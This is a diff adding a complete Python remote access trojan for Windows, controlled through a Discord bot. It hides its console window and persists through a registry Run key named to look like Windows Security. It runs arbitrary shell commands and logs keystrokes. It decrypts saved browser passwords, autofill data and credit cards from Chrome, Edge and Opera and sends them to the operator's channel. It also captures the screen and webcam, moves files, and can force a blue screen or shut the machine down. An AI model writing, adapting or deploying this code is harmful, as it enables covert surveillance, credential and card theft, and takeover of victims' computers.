@@ -1,0 +1,616 @@
+import os
+import sys
+import json
+import base64
+import sqlite3
+import shutil
+import ctypes
+import socket
+import platform
+import threading
+import subprocess
+import urllib.request
+import webbrowser
+from datetime import datetime
+
+# Hide console window instantly if running as a console app
+kernel32 = ctypes.windll.kernel32
+user32 = ctypes.windll.user32
+hwnd = kernel32.GetConsoleWindow()
+if hwnd:
+    user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
+
+# Configuration - Replace these with your own details
+BOT_TOKEN = "YOUR API TOKEN"
+CHANNEL_ID = "YOUR CHANNEL ID" # Replace with your Discord Channel ID (integer)
+
+# Fail-safe check
+if BOT_TOKEN == "YOUR API TOKEN" or CHANNEL_ID == "YOUR CHANNEL ID":
+    ctypes.windll.user32.MessageBoxW(0, "Please configure BOT_TOKEN and CHANNEL_ID in rat.py before running.", "Configuration Error", 0x10)
+    sys.exit(1)
+
+# Import optional third-party libraries safely
+try:
+    import discord
+except ImportError:
+    ctypes.windll.user32.MessageBoxW(0, "discord.py package is not installed.", "Dependency Error", 0x10)
+    sys.exit(1)
+
+try:
+    from PIL import ImageGrab
+except ImportError:
+    ImageGrab = None
+
+try:
+    import cv2
+except ImportError:
+    cv2 = None
+
+try:
+    from pynput import keyboard
+except ImportError:
+    keyboard = None
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    try:
+        from Cryptodome.Cipher import AES
+    except ImportError:
+        AES = None
+
+# Global variables
+keylogger_listener = None
+keylogger_active = False
+KEYLOGS_FILE = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "sys_logs_temp.txt")
+session_name = f"{os.getlogin()}@{socket.gethostname()}"
+
+# Helper: Get master key for browser data decryption
+def get_master_key(local_state_path):
+    if not os.path.exists(local_state_path):
+        return None
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.loads(f.read())
+        
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:]  # Strip DPAPI prefix
+        
+        # DPAPI Decryption structure
+        class DATA_BLOB(ctypes.Structure):
+            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]
+            
+        blob_in = DATA_BLOB(len(encrypted_key), ctypes.cast(ctypes.c_char_p(encrypted_key), ctypes.c_void_p))
+        blob_out = DATA_BLOB()
+        
+        result = ctypes.windll.crypt32.CryptUnprotectData(
+            ctypes.byref(blob_in),
+            None,
+            None,
+            None,
+            None,
+            0,
+            ctypes.byref(blob_out)
+        )
+        if not result:
+            return None
+        
+        key = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+        return key
+    except Exception:
+        return None
+
+# Helper: Decrypt browser encrypted value
+def decrypt_browser_value(ciphertext, key):
+    if not ciphertext:
+        return ""
+    if not key or AES is None:
+        # Fallback to direct DPAPI (older version encryption)
+        try:
+            class DATA_BLOB(ctypes.Structure):
+                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_void_p)]
+            blob_in = DATA_BLOB(len(ciphertext), ctypes.cast(ctypes.c_char_p(ciphertext), ctypes.c_void_p))
+            blob_out = DATA_BLOB()
+            result = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
+            if result:
+                value = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode(errors="ignore")
+                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+                return value
+        except Exception:
+            pass
+        return ""
+        
+    try:
+        if ciphertext.startswith(b"v10") or ciphertext.startswith(b"v11"):
+            iv = ciphertext[3:15]
+            payload = ciphertext[15:-16]
+            tag = ciphertext[-16:]
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt_and_verify(payload, tag)
+            return decrypted.decode(errors="ignore")
+    except Exception:
+        pass
+    return ""
+
+# Helper: Dump credentials from a specific browser
+def dump_browser_credentials(browser_name, local_state_path, login_data_path):
+    if not os.path.exists(login_data_path):
+        return f"[-] {browser_name} Login Data not found.\n"
+    
+    key = get_master_key(local_state_path)
+    temp_db = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"{browser_name}_login_temp.db")
+    
+    try:
+        shutil.copy2(login_data_path, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        rows = cursor.fetchall()
+        
+        output = f"=== {browser_name} Credentials ===\n"
+        count = 0
+        for row in rows:
+            url = row[0]
+            username = row[1]
+            ciphertext = row[2]
+            password = decrypt_browser_value(ciphertext, key)
+            if username or password:
+                output += f"URL: {url}\nUser: {username}\nPass: {password}\n-----------------\n"
+                count += 1
+                
+        cursor.close()
+        conn.close()
+        os.remove(temp_db)
+        return output + f"Total entries decrypted: {count}\n\n"
+    except Exception as e:
+        if os.path.exists(temp_db):
+            os.remove(temp_db)
+        return f"[-] Error dumping {browser_name}: {str(e)}\n"
+
+# Helper: Dump autofill and credit card details
+def dump_browser_autofill(browser_name, local_state_path, web_data_path):
+    if not os.path.exists(web_data_path):
+        return f"[-] {browser_name} Web Data not found.\n"
+        
+    key = get_master_key(local_state_path)
+    temp_db = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"{browser_name}_web_temp.db")
+    
+    output = f"=== {browser_name} Autofill / Cards ===\n"
+    
+    try:
+        shutil.copy2(web_data_path, temp_db)
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # Dump standard Autofill Table
+        try:
+            cursor.execute("SELECT name, value FROM autofill")
+            rows = cursor.fetchall()
+            output += "--- General Autofill Info ---\n"
+            for row in rows:
+                output += f"Name: {row[0]} | Value: {row[1]}\n"
+        except Exception:
+            output += "[-] General Autofill table empty or failed to read.\n"
+            
+        # Dump Credit Cards
+        try:
+            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+            rows = cursor.fetchall()
+            output += "\n--- Saved Credit Cards ---\n"
+            for row in rows:
+                name = row[0]
+                month = row[1]
+                year = row[2]
+                ciphertext = row[3]
+                card_num = decrypt_browser_value(ciphertext, key)
+                output += f"Cardholder: {name}\nExpiry: {month}/{year}\nCard Num: {card_num}\n-----------------\n"
+        except Exception:
+            output += "[-] Credit cards table empty or failed to read.\n"
+            
+        cursor.close()
+        conn.close()
+        os.remove(temp_db)
+        return output + "\n"
+    except Exception as e:
+        if os.path.exists(temp_db):
+            os.remove(temp_db)
+        return f"[-] Error dumping autofill for {browser_name}: {str(e)}\n"
+
+# Keylogger callback
+def keylogger_on_press(key):
+    global KEYLOGS_FILE
+    try:
+        char = key.char
+    except AttributeError:
+        if key == keyboard.Key.space:
+            char = " "
+        elif key == keyboard.Key.enter:
+            char = "\n"
+        elif key == keyboard.Key.backspace:
+            char = " [BACKSPACE] "
+        else:
+            char = f" [{str(key).replace('Key.', '')}] "
+            
+    try:
+        with open(KEYLOGS_FILE, "a", encoding="utf-8") as f:
+            f.write(char)
+    except Exception:
+        pass
+
+# Discord Connection Setup
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+
+@client.event
+async def on_ready():
+    channel = client.get_channel(CHANNEL_ID)
+    if channel:
+        await channel.send(f"🤖 **Session Connected:** `{session_name}`\nPlatform: `{platform.system()} {platform.release()}`\nTime: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`")
+
+@client.event
+async def on_message(message):
+    global keylogger_listener, keylogger_active, KEYLOGS_FILE
+    
+    # Filter channel and check sender
+    if message.channel.id != CHANNEL_ID or message.author == client.user:
+        return
+        
+    content = message.content.strip()
+    
+    # Parse options
+    if content == "!help":
+        help_text = (
+            "⚙️ **Available Options:**\n"
+            "`!help` : Show all options\n"
+            "`!startup` : Add to Windows autostart registry\n"
+            "`!execute <commands>` : Run shell command\n"
+            "`!cd <directory>` : Change working directory\n"
+            "`!process` : List running processes\n"
+            "`!processkill <pid>` : Terminate process by PID\n"
+            "`!shutdown` : Shutdown target system\n"
+            "`!restart` : Restart target system\n"
+            "`!download <filename>` : Download file from host\n"
+            "`!upload` : Upload file to host (attach the file with command)\n"
+            "`!keylog` : Start Keylogger\n"
+            "`!stoplog` : Stop Keylogger and retrieve dump\n"
+            "`!ip` : Get target public IP information\n"
+            "`!sysinfo` : Get detailed system specs\n"
+            "`!screenshot` : Grab host screen\n"
+            "`!webcam` : Capture host webcam frame\n"
+            "`!password` : Decrypt stored passwords\n"
+            "`!autofill` : Dump autofill profiles and credit cards\n"
+            "`!wallpaper` : Change desktop background (attach file or provide URL)\n"
+            "`!bsod` : Force native Blue Screen of Death\n"
+            "`!openlink <url>` : Open URL on chrome/opera/default browser\n"
+        )
+        await message.channel.send(help_text)
+        
+    elif content == "!startup":
+        try:
+            import winreg
+            exe_path = os.path.abspath(sys.executable)
+            if getattr(sys, 'frozen', False):
+                file_path = os.path.abspath(sys.argv[0])
+            else:
+                file_path = os.path.abspath(__file__)
+                file_path = f'"{exe_path.replace("python.exe", "pythonw.exe")}" "{file_path}"'
+                
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsSecurityC2", 0, winreg.REG_SZ, file_path)
+            winreg.CloseKey(key)
+            await message.channel.send(f"✅ Startup registry key added successfully for `{session_name}`.")
+        except Exception as e:
+            await message.channel.send(f"❌ Failed to set startup persistence: {str(e)}")
+            
+    elif content.startswith("!execute "):
+        cmd = content[9:]
+        try:
+            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+            res = (proc.stdout or "") + (proc.stderr or "")
+            if not res.strip():
+                res = "[Command executed, no output returned]"
+                
+            if len(res) > 1900:
+                temp_res = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "cmd_output.txt")
+                with open(temp_res, "w", encoding="utf-8") as f:
+                    f.write(res)
+                await message.channel.send(f"✅ Output is too large, sending file:", file=discord.File(temp_res))
+                os.remove(temp_res)
+            else:
+                await message.channel.send(f"```\n{res}\n```")
+        except Exception as e:
+            await message.channel.send(f"❌ Execution failed: {str(e)}")
+            
+    elif content.startswith("!cd "):
+        target_dir = content[4:]
+        try:
+            os.chdir(target_dir)
+            await message.channel.send(f"📂 Changed directory to: `{os.getcwd()}`")
+        except Exception as e:
+            await message.channel.send(f"❌ Directory change failed: {str(e)}")
+            
+    elif content == "!process":
+        try:
+            proc = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
+            res = proc.stdout or ""
+            if len(res) > 1900:
+                temp_proc = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "process_list.txt")
+                with open(temp_proc, "w", encoding="utf-8") as f:
+                    f.write(res)
+                await message.channel.send("📁 Process list output:", file=discord.File(temp_proc))
+                os.remove(temp_proc)
+            else:
+                await message.channel.send(f"```\n{res}\n```")
+        except Exception as e:
+            await message.channel.send(f"❌ Failed to query process list: {str(e)}")
+            
+    elif content.startswith("!processkill "):
+        pid = content[13:]
+        try:
+            res = subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True, text=True)
+            output = (res.stdout or "") + (res.stderr or "")
+            await message.channel.send(f"⚙️ `taskkill` response:\n`{output.strip()}`")
+        except Exception as e:
+            await message.channel.send(f"❌ Task termination failed: {str(e)}")
+            
+    elif content == "!shutdown":
+        await message.channel.send("⚠️ Shutting down target system...")
+        subprocess.run("shutdown /s /f /t 0", shell=True)
+        
+    elif content == "!restart":
+        await message.channel.send("⚠️ Restarting target system...")
+        subprocess.run("shutdown /r /f /t 0", shell=True)
+        
+    elif content.startswith("!download "):
+        filename = content[10:].strip('"')
+        if not os.path.exists(filename):
+            await message.channel.send("❌ Target file does not exist.")
+            return
+        try:
+            await message.channel.send(file=discord.File(filename))
+        except Exception as e:
+            await message.channel.send(f"❌ Download failed: {str(e)}")
+            
+    elif content == "!upload":
+        if not message.attachments:
+            await message.channel.send("❌ Please attach the file you want to upload with the command.")
+            return
+        try:
+            for attachment in message.attachments:
+                dest = os.path.join(os.getcwd(), attachment.filename)
+                await attachment.save(dest)
+                await message.channel.send(f"✅ Saved file to host: `{dest}`")
+        except Exception as e:
+            await message.channel.send(f"❌ Upload failed: {str(e)}")
+            
+    elif content == "!keylog":
+        if keyboard is None:
+            await message.channel.send("❌ Keylogger module (`pynput`) is missing on host.")
+            return
+        if keylogger_active:
+            await message.channel.send("⚠️ Keylogger is already running.")
+            return
+        try:
+            keylogger_listener = keyboard.Listener(on_press=keylogger_on_press)
+            keylogger_listener.start()
+            keylogger_active = True
+            await message.channel.send("⌨️ Keylogger started on host.")
+        except Exception as e:
+            await message.channel.send(f"❌ Failed to launch keylogger: {str(e)}")
+            
+    elif content == "!stoplog":
+        if not keylogger_active:
+            await message.channel.send("❌ Keylogger is not active.")
+            return
+        try:
+            keylogger_listener.stop()
+            keylogger_listener = None
+            keylogger_active = False
+            
+            if os.path.exists(KEYLOGS_FILE):
+                with open(KEYLOGS_FILE, "r", encoding="utf-8") as f:
+                    data = f.read()
+                if data.strip():
+                    await message.channel.send(file=discord.File(KEYLOGS_FILE))
+                else:
+                    await message.channel.send("📁 Keylogger log was empty.")
+                os.remove(KEYLOGS_FILE)
+            else:
+                await message.channel.send("📁 No log data found.")
+        except Exception as e:
+            await message.channel.send(f"❌ Keylog retrieval error: {str(e)}")
+            
+    elif content == "!ip":
+        try:
+            req = urllib.request.Request("https://ipapi.co/json/", headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req) as url_res:
+                data = json.loads(url_res.read().decode())
+            ip_info = (
+                f"🌐 **IP Metadata:**\n"
+                f"IP: `{data.get('ip')}`\n"
+                f"City: `{data.get('city')}`\n"
+                f"Region: `{data.get('region')}`\n"
+                f"Country: `{data.get('country_name')}`\n"
+                f"ISP: `{data.get('org')}`\n"
+            )
+            await message.channel.send(ip_info)
+        except Exception as e:
+            await message.channel.send(f"❌ IP extraction failed: {str(e)}")
+            
+    elif content == "!sysinfo":
+        try:
+            # Query RAM info via cmd
+            ram_cmd = subprocess.run("wmic OS get TotalVisibleMemorySize /Value", shell=True, capture_output=True, text=True)
+            ram_lines = [l.split("=")[1].strip() for l in ram_cmd.stdout.splitlines() if "=" in l]
+            total_ram_kb = int(ram_lines[0]) if ram_lines else 0
+            total_ram_gb = round(total_ram_kb / (1024 * 1024), 2)
+            
+            info = (
+                f"💻 **Host Spec Data:**\n"
+                f"Hostname: `{socket.gethostname()}`\n"
+                f"User Session: `{os.getlogin()}`\n"
+                f"Processor: `{platform.processor()}`\n"
+                f"Architecture: `{platform.architecture()[0]}`\n"
+                f"OS release: `{platform.system()} {platform.version()}`\n"
+                f"Total Memory: `{total_ram_gb} GB`\n"
+            )
+            await message.channel.send(info)
+        except Exception as e:
+            await message.channel.send(f"❌ Sysinfo extraction failed: {str(e)}")
+            
+    elif content == "!screenshot":
+        if ImageGrab is None:
+            await message.channel.send("❌ Pillow dependency is missing on host.")
+            return
+        temp_img = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "screen_temp.png")
+        try:
+            img = ImageGrab.grab()
+            img.save(temp_img)
+            await message.channel.send(file=discord.File(temp_img))
+            os.remove(temp_img)
+        except Exception as e:
+            await message.channel.send(f"❌ Screenshot failed: {str(e)}")
+            if os.path.exists(temp_img):
+                os.remove(temp_img)
+                
+    elif content == "!webcam":
+        if cv2 is None:
+            await message.channel.send("❌ OpenCV dependency is missing on host.")
+            return
+        temp_cam = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "cam_temp.png")
+        try:
+            cam = cv2.VideoCapture(0)
+            if not cam.isOpened():
+                await message.channel.send("❌ Web camera index 0 is not available.")
+                return
+            ret, frame = cam.read()
+            cam.release()
+            if ret:
+                cv2.imwrite(temp_cam, frame)
+                await message.channel.send(file=discord.File(temp_cam))
+                os.remove(temp_cam)
+            else:
+                await message.channel.send("❌ Failed to grab webcam frames.")
+        except Exception as e:
+            await message.channel.send(f"❌ Webcam capture failed: {str(e)}")
+            if os.path.exists(temp_cam):
+                os.remove(temp_cam)
+                
+    elif content == "!password":
+        await message.channel.send("🛡️ Extraction of credentials initiated...")
+        user_profile = os.environ.get("USERPROFILE", "C:\\Users")
+        
+        # Configure targets
+        targets = [
+            ("Chrome", 
+             os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"),
+             os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")),
+            ("Edge",
+             os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State"),
+             os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")),
+            ("Opera",
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State"),
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")),
+            ("OperaGX",
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State"),
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"))
+        ]
+        
+        full_res = ""
+        for name, state, db in targets:
+            full_res += dump_browser_credentials(name, state, db)
+            
+        temp_txt = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "credentials_dump.txt")
+        try:
+            with open(temp_txt, "w", encoding="utf-8") as f:
+                f.write(full_res)
+            await message.channel.send("🔑 Stored password records:", file=discord.File(temp_txt))
+            os.remove(temp_txt)
+        except Exception as e:
+            await message.channel.send(f"❌ Password delivery failure: {str(e)}")
+            
+    elif content == "!autofill":
+        await message.channel.send("📋 Extraction of browser Autofill and Cards initiated...")
+        user_profile = os.environ.get("USERPROFILE", "C:\\Users")
+        
+        targets = [
+            ("Chrome", 
+             os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"),
+             os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Web Data")),
+            ("Edge",
+             os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State"),
+             os.path.join(user_profile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Web Data")),
+            ("Opera",
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State"),
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera Stable", "Web Data")),
+            ("OperaGX",
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State"),
+             os.path.join(user_profile, "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Web Data"))
+        ]
+        
+        full_res = ""
+        for name, state, db in targets:
+            full_res += dump_browser_autofill(name, state, db)
+            
+        temp_txt = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "autofill_dump.txt")
+        try:
+            with open(temp_txt, "w", encoding="utf-8") as f:
+                f.write(full_res)
+            await message.channel.send("📄 Autofill and card profiles:", file=discord.File(temp_txt))
+            os.remove(temp_txt)
+        except Exception as e:
+            await message.channel.send(f"❌ Autofill delivery failure: {str(e)}")
+            
+    elif content.startswith("!wallpaper"):
+        await message.channel.send("🖼️ Setting new desktop background...")
+        temp_img = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "wallpaper_temp.jpg")
+        
+        try:
+            # Check if file attached
+            if message.attachments:
+                await message.attachments[0].save(temp_img)
+            else:
+                url = content[10:].strip()
+                if not url:
+                    await message.channel.send("❌ Provide wallpaper URL or attach an image.")
+                    return
+                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req) as response, open(temp_img, 'wb') as out_file:
+                    out_file.write(response.read())
+            
+            # Invoke SystemParametersInfoW
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_img, 3)  # SPI_SETDESKWALLPAPER = 20
+            await message.channel.send("✅ Wallpaper set successfully.")
+        except Exception as e:
+            await message.channel.send(f"❌ Wallpaper configuration failed: {str(e)}")
+            
+    elif content == "!bsod":
+        await message.channel.send("💀 Sending BSOD command privilege requests...")
+        try:
+            # Trigger BSOD using ntdll
+            ntdll = ctypes.windll.ntdll
+            enabled = ctypes.c_bool()
+            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(enabled))  # SeShutdownPrivilege = 19
+            
+            response = ctypes.c_ulong()
+            # 0xC0000420: STATUS_ASSERTION_FAILURE
+            ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(response))
+            await message.channel.send("✅ BSOD command issued.")
+        except Exception as e:
+            await message.channel.send(f"❌ BSOD execution failed: {str(e)}")
+            
+    elif content.startswith("!openlink "):
+        url = content[10:].strip()
+        try:
+            webbrowser.open(url)
+            await message.channel.send(f"🔗 Opened URL: `{url}`")
+        except Exception as e:
+            await message.channel.send(f"❌ Failed to open link: {str(e)}")
+
+# Launch client
+try:
+    client.run(BOT_TOKEN)
+except Exception as e:
+    ctypes.windll.user32.MessageBoxW(0, f"Discord connection loop crashed: {str(e)}", "Runtime Connection Crash", 0x10)
